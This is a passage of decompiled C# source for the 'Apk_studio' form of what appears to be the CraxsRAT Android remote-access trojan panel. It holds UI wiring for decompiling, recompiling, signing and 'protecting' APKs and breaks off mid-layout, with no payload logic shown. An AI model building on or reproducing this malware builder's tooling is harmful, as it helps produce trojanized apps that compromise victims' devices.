using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Craxs_Rat.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class Apk_studio : Form
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__116_002D0
	{
		public string _0024VB_0024Local_appname;

		public string _0024VB_0024Local_PackageName;

		public string _0024VB_0024Local_Vercode;

		public string _0024VB_0024Local_Vername;

		public string _0024VB_0024Local_androidfrom;

		public string _0024VB_0024Local_androidto;

		public Apk_studio _0024VB_0024Me;

		public _Closure_0024__116_002D0(_Closure_0024__116_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_appname = arg0._0024VB_0024Local_appname;
				_0024VB_0024Local_PackageName = arg0._0024VB_0024Local_PackageName;
				_0024VB_0024Local_Vercode = arg0._0024VB_0024Local_Vercode;
				_0024VB_0024Local_Vername = arg0._0024VB_0024Local_Vername;
				_0024VB_0024Local_androidfrom = arg0._0024VB_0024Local_androidfrom;
				_0024VB_0024Local_androidto = arg0._0024VB_0024Local_androidto;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			_0024VB_0024Me.nametext.Text = "الأسم: " + _0024VB_0024Local_appname;
			_0024VB_0024Me.pkgtext.Text = "المعرف: " + _0024VB_0024Local_PackageName;
			_0024VB_0024Me.vercodtext.Text = "رقم الاصدار: " + _0024VB_0024Local_Vercode;
			_0024VB_0024Me.vernamtext.Text = "اسم الاصدار: " + _0024VB_0024Local_Vername;
			_0024VB_0024Me.andfromtext.Text = "يدعم من: " + _0024VB_0024Local_androidfrom;
			_0024VB_0024Me.andtotext.Text = "يدعم حتى: " + _0024VB_0024Local_androidto;
		}

		[SpecialName]
		internal void _Lambda_0024__1()
		{
			_0024VB_0024Me.nametext.Text = "姓名: " + _0024VB_0024Local_appname;
			_0024VB_0024Me.pkgtext.Text = "标识符: " + _0024VB_0024Local_PackageName;
			_0024VB_0024Me.vercodtext.Text = "版本代码: " + _0024VB_0024Local_Vercode;
			_0024VB_0024Me.vernamtext.Text = "版本名称: " + _0024VB_0024Local_Vername;
			_0024VB_0024Me.andfromtext.Text = "来自的支持: " + _0024VB_0024Local_androidfrom;
			_0024VB_0024Me.andtotext.Text = "支持高达: " + _0024VB_0024Local_androidto;
		}

		[SpecialName]
		internal void _Lambda_0024__2()
		{
			_0024VB_0024Me.nametext.Text = "App Name: " + _0024VB_0024Local_appname;
			_0024VB_0024Me.pkgtext.Text = "Package Name: " + _0024VB_0024Local_PackageName;
			_0024VB_0024Me.vercodtext.Text = "Version Code: " + _0024VB_0024Local_Vercode;
			_0024VB_0024Me.vernamtext.Text = "Version Name: " + _0024VB_0024Local_Vername;
			_0024VB_0024Me.andfromtext.Text = "Support from: " + _0024VB_0024Local_androidfrom;
			_0024VB_0024Me.andtotext.Text = "Support up to: " + _0024VB_0024Local_androidto;
		}
	}

	private IContainer components;

	[AccessedThroughProperty("TargetApktext")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUITextBox _TargetApktext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("selectapkbtn")]
	private Button _selectapkbtn;

	[CompilerGenerated]
	[AccessedThroughProperty("savebtn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Button _savebtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BackgroundWorker1")]
	private BackgroundWorker _BackgroundWorker1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("debtn")]
	private Button _debtn;

	[CompilerGenerated]
	[AccessedThroughProperty("pkgtext")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Label _pkgtext;

	[AccessedThroughProperty("nametext")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Label _nametext;

	[AccessedThroughProperty("andfromtext")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Label _andfromtext;

	[AccessedThroughProperty("vernamtext")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Label _vernamtext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("vercodtext")]
	private Label _vercodtext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("andtotext")]
	private Label _andtotext;

	[AccessedThroughProperty("sinbtn")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Button _sinbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("cobtn")]
	private Button _cobtn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("probtn")]
	[CompilerGenerated]
	private Button _probtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("protectworker")]
	private BackgroundWorker _protectworker;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("deworker")]
	private BackgroundWorker _deworker;

	[AccessedThroughProperty("COworker")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private BackgroundWorker _COworker;

	private string TargetAPKPATH;

	private string TargetAPKNAME;

	private string TargetWorkPATH;

	private string craxsStudioPath;

	private string APKINFO;

	private string Apkeditorpath;

	[field: AccessedThroughProperty("toppanel")]
	internal virtual Panel toppanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox TargetApktext
	{
		[CompilerGenerated]
		get
		{
			return _TargetApktext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TargetApktext_TextChanged;
			DrakeUITextBox drakeUITextBox = _TargetApktext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_TargetApktext = value;
			drakeUITextBox = _TargetApktext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	internal virtual Button selectapkbtn
	{
		[CompilerGenerated]
		get
		{
			return _selectapkbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Selectapkbtn_Click;
			Button button = _selectapkbtn;
			if (button != null)
			{
				button.Click -= value2;
			}
			_selectapkbtn = value;
			button = _selectapkbtn;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("workpanel")]
	internal virtual Panel workpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button savebtn
	{
		[CompilerGenerated]
		get
		{
			return _savebtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Button1_Click;
			Button button = _savebtn;
			if (button != null)
			{
				button.Click -= value2;
			}
			_savebtn = value;
			button = _savebtn;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("apkicon")]
	internal virtual PictureBox apkicon
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker BackgroundWorker1
	{
		[CompilerGenerated]
		get
		{
			return _BackgroundWorker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = BackgroundWorker1_DoWork;
			BackgroundWorker backgroundWorker = _BackgroundWorker1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_BackgroundWorker1 = value;
			backgroundWorker = _BackgroundWorker1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button debtn
	{
		[CompilerGenerated]
		get
		{
			return _debtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Button2_Click;
			Button button = _debtn;
			if (button != null)
			{
				button.Click -= value2;
			}
			_debtn = value;
			button = _debtn;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("workdirtext")]
	internal virtual DrakeUITextBox workdirtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("titlespanel")]
	internal virtual Panel titlespanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label pkgtext
	{
		[CompilerGenerated]
		get
		{
			return _pkgtext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Andtotext_Click;
			Label label = _pkgtext;
			if (label != null)
			{
				label.Click -= value2;
			}
			_pkgtext = value;
			label = _pkgtext;
			if (label != null)
			{
				label.Click += value2;
			}
		}
	}

	internal virtual Label nametext
	{
		[CompilerGenerated]
		get
		{
			return _nametext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Andtotext_Click;
			Label label = _nametext;
			if (label != null)
			{
				label.Click -= value2;
			}
			_nametext = value;
			label = _nametext;
			if (label != null)
			{
				label.Click += value2;
			}
		}
	}

	internal virtual Label andfromtext
	{
		[CompilerGenerated]
		get
		{
			return _andfromtext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Andtotext_Click;
			Label label = _andfromtext;
			if (label != null)
			{
				label.Click -= value2;
			}
			_andfromtext = value;
			label = _andfromtext;
			if (label != null)
			{
				label.Click += value2;
			}
		}
	}

	internal virtual Label vernamtext
	{
		[CompilerGenerated]
		get
		{
			return _vernamtext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Andtotext_Click;
			Label label = _vernamtext;
			if (label != null)
			{
				label.Click -= value2;
			}
			_vernamtext = value;
			label = _vernamtext;
			if (label != null)
			{
				label.Click += value2;
			}
		}
	}

	internal virtual Label vercodtext
	{
		[CompilerGenerated]
		get
		{
			return _vercodtext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Andtotext_Click;
			Label label = _vercodtext;
			if (label != null)
			{
				label.Click -= value2;
			}
			_vercodtext = value;
			label = _vercodtext;
			if (label != null)
			{
				label.Click += value2;
			}
		}
	}

	internal virtual Label andtotext
	{
		[CompilerGenerated]
		get
		{
			return _andtotext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Andtotext_Click;
			Label label = _andtotext;
			if (label != null)
			{
				label.Click -= value2;
			}
			_andtotext = value;
			label = _andtotext;
			if (label != null)
			{
				label.Click += value2;
			}
		}
	}

	internal virtual Button sinbtn
	{
		[CompilerGenerated]
		get
		{
			return _sinbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Button3_Click;
			Button button = _sinbtn;
			if (button != null)
			{
				button.Click -= value2;
			}
			_sinbtn = value;
			button = _sinbtn;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button cobtn
	{
		[CompilerGenerated]
		get
		{
			return _cobtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Button4_Click;
			Button button = _cobtn;
			if (button != null)
			{
				button.Click -= value2;
			}
			_cobtn = value;
			button = _cobtn;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button probtn
	{
		[CompilerGenerated]
		get
		{
			return _probtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Button5_Click;
			Button button = _probtn;
			if (button != null)
			{
				button.Click -= value2;
			}
			_probtn = value;
			button = _probtn;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual BackgroundWorker protectworker
	{
		[CompilerGenerated]
		get
		{
			return _protectworker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = Protectworker_DoWork;
			BackgroundWorker backgroundWorker = _protectworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_protectworker = value;
			backgroundWorker = _protectworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	internal virtual BackgroundWorker deworker
	{
		[CompilerGenerated]
		get
		{
			return _deworker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = Deworker_DoWork;
			BackgroundWorker backgroundWorker = _deworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_deworker = value;
			backgroundWorker = _deworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	internal virtual BackgroundWorker COworker
	{
		[CompilerGenerated]
		get
		{
			return _COworker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = COworker_DoWork;
			BackgroundWorker backgroundWorker = _COworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_COworker = value;
			backgroundWorker = _COworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("logtext")]
	internal virtual RichTextBox logtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.toppanel = new System.Windows.Forms.Panel();
		this.Label2 = new System.Windows.Forms.Label();
		this.workdirtext = new DrakeUI.Framework.DrakeUITextBox();
		this.selectapkbtn = new System.Windows.Forms.Button();
		this.TargetApktext = new DrakeUI.Framework.DrakeUITextBox();
		this.workpanel = new System.Windows.Forms.Panel();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.logtext = new System.Windows.Forms.RichTextBox();
		this.probtn = new System.Windows.Forms.Button();
		this.cobtn = new System.Windows.Forms.Button();
		this.sinbtn = new System.Windows.Forms.Button();
		this.titlespanel = new System.Windows.Forms.Panel();
		this.andtotext = new System.Windows.Forms.Label();
		this.andfromtext = new System.Windows.Forms.Label();
		this.vernamtext = new System.Windows.Forms.Label();
		this.vercodtext = new System.Windows.Forms.Label();
		this.pkgtext = new System.Windows.Forms.Label();
		this.nametext = new System.Windows.Forms.Label();
		this.debtn = new System.Windows.Forms.Button();
		this.savebtn = new System.Windows.Forms.Button();
		this.apkicon = new System.Windows.Forms.PictureBox();
		this.BackgroundWorker1 = new System.ComponentModel.BackgroundWorker();
		this.Label1 = new System.Windows.Forms.Label();
		this.protectworker = new System.ComponentModel.BackgroundWorker();
		this.deworker = new System.ComponentModel.BackgroundWorker();
		this.COworker = new System.ComponentModel.BackgroundWorker();
		this.toppanel.SuspendLayout();
		this.workpanel.SuspendLayout();
		this.Panel1.SuspendLayout();
		this.titlespanel.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.apkicon).BeginInit();
		base.SuspendLayout();
		this.toppanel.Controls.Add(this.Label2);
		this.toppanel.Controls.Add(this.workdirtext);
		this.toppanel.Controls.Add(this.selectapkbtn);
		this.toppanel.Controls.Add(this.TargetApktext);
		this.toppanel.Dock = System.Windows.Forms.DockStyle.Top;
		this.toppanel.Location = new System.Drawing.Point(0, 20);
		this.toppanel.Name = "toppanel";
		this.toppanel.Size = new System.Drawing.Size(762, 117);
		this.toppanel.TabIndex = 0;
		this.Label2.Font = new System.Drawing.Font("Calibri", 12f);
		this.Label2.Location = new System.Drawing.Point(603, 66);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(143, 32);
		this.Label2.TabIndex = 47;
		this.Label2.Text = "Work DIR";
		this.Label2.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.workdirtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.workdirtext.Enabled = false;
		this.workdirtext.FillColor = System.Drawing.Color.Black;
		this.workdirtext.FillDisableColor = System.Drawing.Color.Black;
		this.workdirtext.Font = new System.Drawing.Font("Calibri", 12f);
		this.workdirtext.ForeColor = System.Drawing.Color.White;
		this.workdirtext.ForeDisableColor = System.Drawing.Color.White;
		this.workdirtext.Location = new System.Drawing.Point(5, 66);
		this.workdirtext.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.workdirtext.Maximum = 2147483647.0;
		this.workdirtext.Minimum = -2147483648.0;
		this.workdirtext.Name = "workdirtext";
		this.workdirtext.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.workdirtext.Radius = 10;
		this.workdirtext.RectColor = System.Drawing.Color.SkyBlue;
		this.workdirtext.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.workdirtext.Size = new System.Drawing.Size(590, 32);
		this.workdirtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.workdirtext.StyleCustomMode = true;
		this.workdirtext.TabIndex = 46;
		this.workdirtext.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
		this.workdirtext.Watermark = "Target Apk";
		this.selectapkbtn.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.selectapkbtn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.selectapkbtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.selectapkbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.selectapkbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.selectapkbtn.Location = new System.Drawing.Point(603, 22);
		this.selectapkbtn.Name = "selectapkbtn";
		this.selectapkbtn.Size = new System.Drawing.Size(147, 32);
		this.selectapkbtn.TabIndex = 45;
		this.selectapkbtn.Text = "Select APK";
		this.selectapkbtn.UseVisualStyleBackColor = true;
		this.TargetApktext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.TargetApktext.Enabled = false;
		this.TargetApktext.FillColor = System.Drawing.Color.Black;
		this.TargetApktext.FillDisableColor = System.Drawing.Color.Black;
		this.TargetApktext.Font = new System.Drawing.Font("Calibri", 12f);
		this.TargetApktext.ForeColor = System.Drawing.Color.White;
		this.TargetApktext.ForeDisableColor = System.Drawing.Color.White;
		this.TargetApktext.Location = new System.Drawing.Point(5, 22);
		this.TargetApktext.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.TargetApktext.Maximum = 2147483647.0;
		this.TargetApktext.Minimum = -2147483648.0;
		this.TargetApktext.Name = "TargetApktext";
		this.TargetApktext.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.TargetApktext.Radius = 10;
		this.TargetApktext.RectColor = System.Drawing.Color.SkyBlue;
		this.TargetApktext.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.TargetApktext.Size = new System.Drawing.Size(590, 32);
		this.TargetApktext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.TargetApktext.StyleCustomMode = true;
		this.TargetApktext.TabIndex = 44;
		this.TargetApktext.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
		this.TargetApktext.Watermark = "Target Apk";
		this.workpanel.Controls.Add(this.Panel1);
		this.workpanel.Controls.Add(this.probtn);
		this.workpanel.Controls.Add(this.cobtn);
		this.workpanel.Controls.Add(this.sinbtn);
		this.workpanel.Controls.Add(this.titlespanel);
		this.workpanel.Controls.Add(this.debtn);
		this.workpanel.Controls.Add(this.savebtn);
		this.workpanel.Controls.Add(this.apkicon);
		this.workpanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.workpanel.Location = new System.Drawing.Point(0, 137);
		this.workpanel.Name = "workpanel";
		this.workpanel.Size = new System.Drawing.Size(762, 492);
		this.workpanel.TabIndex = 1;
		this.Panel1.Controls.Add(this.logtext);
		this.Panel1.Location = new System.Drawing.Point(16, 351);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(730, 129);
		this.Panel1.TabIndex = 54;
		this.logtext.BackColor = System.Drawing.Color.Black;
		this.logtext.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.logtext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.logtext.Font = new System.Drawing.Font("Calibri", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.logtext.ForeColor = System.Drawing.Color.Lime;
		this.logtext.Location = new System.Drawing.Point(0, 0);
		this.logtext.Name = "logtext";
		this.logtext.ReadOnly = true;
		this.logtext.Size = new System.Drawing.Size(730, 129);
		this.logtext.TabIndex = 0;
		this.logtext.Text = "";
		this.probtn.BackgroundImage = Craxs_Rat.My.Resources.Resources.protect;
		this.probtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		this.probtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.probtn.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(15, 15, 15);
		this.probtn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(15, 15, 15);
		this.probtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.probtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.probtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.probtn.Location = new System.Drawing.Point(620, 15);
		this.probtn.Name = "probtn";
		this.probtn.Size = new System.Drawing.Size(126, 134);
		this.probtn.TabIndex = 53;
		this.probtn.Text = "Protect APK";
		this.probtn.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
		this.probtn.UseVisualStyleBackColor = true;
		this.cobtn.BackgroundImage = Craxs_Rat.My.Resources.Resources.Compile;
		this.cobtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		this.cobtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.cobtn.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(15, 15, 15);
		this.cobtn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(15, 15, 15);
		this.cobtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.cobtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.cobtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.cobtn.Location = new System.Drawing.Point(318, 15);
		this.cobtn.Name = "cobtn";
		this.cobtn.Size = new System.Drawing.Size(126, 134);
		this.cobtn.TabIndex = 52;
		this.cobtn.Text = "Compile";
		this.cobtn.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
		this.cobtn.UseVisualStyleBackColor = true;
		this.sinbtn.BackgroundImage = Craxs_Rat.My.Resources.Resources.sign;
		this.sinbtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		this.sinbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.sinbtn.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(15, 15, 15);
		this.sinbtn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(15, 15, 15);
		this.sinbtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.sinbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.sinbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.sinbtn.Location = new System.Drawing.Point(469, 15);
		this.sinbtn.Name = "sinbtn";
		this.sinbtn.Size = new System.Drawing.Size(126, 134);
		this.sinbtn.TabIndex = 51;
		this.sinbtn.Text = "Sign APK";
		this.sinbtn.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
		this.sinbtn.UseVisualStyleBackColor = true;
		this.titlespanel.Controls.Add(this.andtotext);
		this.titlespanel.Controls.Add(this.andfromtext);
		this.titlespanel.Controls.Add(this.vernamtext);
		this.titlespanel.Controls.Add(this.vercodtext);
		this.titlespanel.Controls.Add(this.pkgtext);
		this.titlespanel.Controls.Add(this.nametext);
		this.titlespanel.Enabled = false;
		this.titlespanel.Location = new System.Drawing.Point(150, 176);
		this.titlespanel.Name = "titlespanel";
		this.titlespanel.Size = new System.Drawing.Size(600, 154);
		this.titlespanel.TabIndex = 50;
		this.andtotext.Cursor = System.Windows.Forms.Cursors.Hand;
		this.andtotext.Dock = System.Windows.Forms.DockStyle.Top;
		this.andtotext.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.andtotext.Font = new System.Drawing.Font("Calibri", 9f);
		this.andtotext.Location = new System.Drawing.Point(0, 115);
		this.andtotext.Name = "andtotext";
		this.andtotext.Size = new System.Drawing.Size(600, 23);
		this.andtotext.TabIndex = 53;
		this.andtotext.Text = "Support to:";
		this.andtotext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.andfromtext.Cursor = System.Windows.Forms.Cursors.Hand;
		this.andfromtext.Dock = System.Windows.Forms.DockStyle.Top;
		this.andfromtext.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.andfromtext.Font = new System.Drawing.Font("Calibri", 9f);
		this.andfromtext.Location = new System.Drawing.Point(0, 92);
		this.andfromtext.Name = "andfromtext";
		this.andfromtext.Size = new System.Drawing.Size(600, 23);
		this.andfromtext.TabIndex = 52;
		this.andfromtext.Text = "Support From:";
		this.andfromtext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.vernamtext.Cursor = System.Windows.Forms.Cursors.Hand;
		this.vernamtext.Dock = System.Windows.Forms.DockStyle.Top;
		this.vernamtext.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.vernamtext.Font = new System.Drawing.Font("Calibri", 9f);
		this.vernamtext.Location = new System.Drawing.Point(0, 69);
		this.vernamtext.Name = "vernamtext";
		this.vernamtext.Size = new System.Drawing.Size(600, 23);
		this.vernamtext.TabIndex = 51;
		this.vernamtext.Text = "Version Name:";
		this.vernamtext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.vercodtext.Cursor = System.Windows.Forms.Cursors.Hand;
		this.vercodtext.Dock = System.Windows.Forms.DockStyle.Top;
		this.vercodtext.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.vercodtext.Font = new System.Drawing.Font("Calibri", 9f);
		this.vercodtext.Location = new System.Drawing.Point(0, 46);
		this.vercodtext.Name = "vercodtext";
		this.vercodtext.Size = new System.Drawing.Size(600, 23);
		this.vercodtext.TabIndex = 50;
		this.vercodtext.Text = "Version Code:";
		this.vercodtext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.pkgtext.Cursor = System.Windows.Forms.Cursors.Hand;
		this.pkgtext.Dock = System.Windows.Forms.DockStyle.Top;
		this.pkgtext.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.pkgtext.Font = new System.Drawing.Font("Calibri", 9f);
		this.pkgtext.Location = new System.Drawing.Point(0, 23);
		this.pkgtext.Name = "pkgtext";
		this.pkgtext.Size = new System.Drawing.Size(600, 23);
		this.pkgtext.TabIndex = 49;
		this.pkgtext.Text = "Package Name:";
		this.pkgtext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.nametext.Cursor = System.Windows.Forms.Cursors.Hand;
		this.nametext.Dock = System.Windows.Forms.DockStyle.Top;
		this.nametext.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.nametext.Font = new System.Drawing.Font("Calibri", 9f);
		this.nametext.Location = new System.Drawing.Point(0, 0);
		this.nametext.Name = "nametext";
		this.nametext.Size = new System.Drawing.Size(600, 23);
		this.nametext.TabIndex = 48;
		this.nametext.Text = "App Name:";
		this.nametext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.debtn.BackgroundImage = Craxs_Rat.My.Resources.Resources.Decompile;
		this.debtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		this.debtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.debtn.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(15, 15, 15);
		this.debtn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(15, 15, 15);
		this.debtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.debtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.debtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.debtn.Location = new System.Drawing.Point(167, 15);
		this.debtn.Name = "debtn";
		this.debtn.Size = new System.Drawing.Size(126, 134);
		this.debtn.TabIndex = 49;
		this.debtn.Text = "Decompile";
		this.debtn.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
		this.debtn.UseVisualStyleBackColor = true;
		this.savebtn.BackgroundImage = Craxs_Rat.My.Resources.Resources.InstallApk;
		this.savebtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
